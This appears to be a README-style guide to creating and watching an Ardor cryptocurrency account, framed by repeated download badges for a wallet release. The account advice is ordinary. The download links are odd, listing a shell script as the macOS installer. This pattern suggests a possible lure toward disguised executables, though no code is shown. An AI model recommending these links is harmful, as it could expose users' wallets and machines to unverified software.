![Ardor Wallet guide](assets/banner-article.png)

# Create an Ardor account, read its address, and watch one without a passphrase

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Creating an Ardor account takes one secret and no sign-up. The wallet derives the address from a passphrase or seed, and that address exists whether or not anyone has ever sent it a coin. The passphrase tab is the only screen that can spend from it, while the account tab watches the same address read-only.

## What an account actually is

An Ardor account is not a row in a database. It is an address derived mathematically from a secret, which means it comes into existence the moment the secret does, with no registration, no confirmation email and no server that has to approve it.

That has two consequences people meet on the same day. The first is that you can receive funds before you ever open the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md), because the sender only needs the address. The second is that two different secrets produce two different accounts, always, even when they differ by one character. There is no "account recovery" step later that can merge or restore them.

The address itself is public. It is safe to share, it appears on screen with a checksum built into the format, and the wallet refuses an address that fails that check. The secret behind it is the opposite: it must never be typed into a website, a chat, a support form or a browser extension, because whoever holds it holds the account.

## Passphrase or seed: choose before you create anything

The wallet supports two kinds of secret, and they are not interchangeable in the way people assume.

| Secret | What it is | When it makes sense |
|---|---|---|
| Passphrase | Twelve words by default, generated from a large dictionary, and the legacy method | An account that already exists, or a setup that must match older backups |
| Seed | BIP32/BIP39/BIP44 with a standard derivation path, the method recommended for new accounts | Anything created now, especially where a hardware device or another wallet may need to read it later |

Both open the same wallet and both reach every child chain. The difference is portability and habit: a seed follows a standard that other tools can read, and a [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) is a sentence whose exact characters matter. If you are unsure which one your existing backup holds, the comparison guide settles it before you type anything.

## Create the account

1. Install the wallet and start it, choosing full client or [light client](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md).
2. Open the passphrase tab, or the seed tab if you are creating a seed account.
3. Let the wallet generate a secret, or enter the one you already keep. Do not invent a short phrase; the generator exists because human-chosen secrets are guessable.
4. Write the secret down by hand, in order, and check it character by character against the screen.
5. Confirm the address the wallet shows, then close and reopen the wallet and confirm the same address appears again.

Step five is the one people skip. It is also the only step that proves the written copy is right before the account holds anything worth losing.

## Read the address correctly

An Ardor address starts with the platform prefix and continues in groups of four characters, ending with a five-character block that carries a checksum. The checksum is why a mistyped address is rejected instead of sending funds into nowhere, and it is also why an address cannot be shortened or rounded when you copy it by hand.

The wallet offers a QR code for the address, which is the safer way to move it to a phone or a second screen. When you paste an address into a send form, check the first and last groups against the source rather than trusting the middle, because clipboard malware typically swaps the whole string for one that looks similar at a glance.

## Watch an address without a passphrase

The account tab accepts a public address and shows its [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md)s and history with no ability to spend. That is the correct way to monitor an account on a machine that should never see the secret: a work laptop, a shared desktop, a phone you read on the train.

Watching is not a login. Nothing is unlocked, no session is created and closing the tab ends it. If a page asks for a passphrase in order to show a balance, it is not a watch-only view, whatever it calls itself.

## More than one account

One wallet can hold as many accounts as you have secrets. Switching means entering a different passphrase or seed on the passphrase tab, and the account tab can hold several addresses at once for reading. There is no profile system and no per-account password, so organising accounts is really organising the secrets that produce them.

A practical split is a main account for holdings and a second one for trading or testing, each with its own written backup kept in the same careful way. Two accounts do not protect each other: losing one secret loses that account and nothing else, which is exactly the point of separating them.

## FAQ

### Does creating an account cost anything?

No. Deriving an address is local arithmetic, and the account exists before it holds a balance. The first cost is the network fee on the first transaction you send.

### Can I create an account without the wallet?

The address is derived from the secret, so any compatible tool that implements the same derivation produces the same account. Using the wallet keeps the secret on your own machine and avoids trusting a web page with it.

### Why do two accounts have similar-looking addresses?

They do not share characters by accident; the format is fixed, so every address looks alike at the start. Compare the whole string, and compare the checksum group at the end if you are checking by eye.

### What happens if I enter the same passphrase twice?

You get the same account both times. That is the test worth running after setup: if the second entry produces a different address, the written copy is wrong.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Can you reset an Ardor passphrase? No - here is what to do](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md)
- [Recover a passphrase that has a typo](https://github.com/ardor-software/ardor-wallet-guides/blob/main/recovering-a-passphrase-typo-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
